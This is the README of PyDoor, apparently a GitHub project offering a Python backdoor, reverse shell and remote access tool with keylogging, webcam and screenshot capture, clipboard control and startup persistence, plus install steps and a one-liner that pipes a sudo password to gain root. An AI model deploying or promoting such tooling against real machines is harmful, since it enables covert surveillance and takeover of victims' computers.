# PyDoor  
  
Encrypted Python Backdoor/Reverse Shell/RAT in Python 3.  
  
## Cross-Platform Features  
  
* Multi-client support  
* Cross-platform  
* Remote Shell that updates in real time  
* Remote Python Interpreter  
* Simple File Transfer  
* AES Encryption by Default  
* Keylogger  
* Manage Clipboard Remotely  
* Capture Webcam  
* Take Screenshots Remotely  
* Sending commands to all clients  
* Download files from the web  
* Restart Sessions (New Encryption Keys)  
* And more...  
  
## Windows Specific Features  
  
* Add Client to Startup  
* Lock, Shutdown and Restart Client Machines  
  
Windows Specific Features can be done manually on other OS's  
  
## Installation  
  
You will need:  
  
* [Python 3.6-3.7](https://www.python.org/downloads)  
  
1. Download the repository via github or git eg. `git clone https://github.com/Y4hL/PyDoor`  
2. Install the required modules by running `python -m pip install -r requirements.txt`  
3. Change default AES key (Recommended)  
  
## FAQ  
  
### Setup Remote Server  
  
Read [setup.md](https://github.com/Y4hL/PyDoor/blob/master/setup.md#server-setup)  
  
### Connect to Remote Server  
  
Read [setup.md](https://github.com/Y4hL/PyDoor/blob/master/setup.md#client-setup)  
  
### Run commands as root  
  
`echo SUDOPASSWORD | sudo -S COMMAND`  
  
### See Importable packages in python interpreter  
  
`help("modules")`  
  
## Help  
  
If you need any help at all, feel free to post a "help" issue.  
  
## Contributing  
  
Contributing is encouraged and will help make a better program. Please refer to [this](https://gist.github.com/MarcDiethelm/7303312) before contributing.  
  
## Disclaimer  
  
This program must be used for legal purposes! I am not responsible for anything you do with it.  
  
## License  
  
[License](https://github.com/Y4hL/PyDoor/blob/master/LICENSE)  
  
Project heavily inspired by [buckyroberts/Turtle](https://github.com/buckyroberts/Turtle) and [xp4xbox/Python-Backdoor](https://github.com/xp4xbox/Python-Backdoor)  
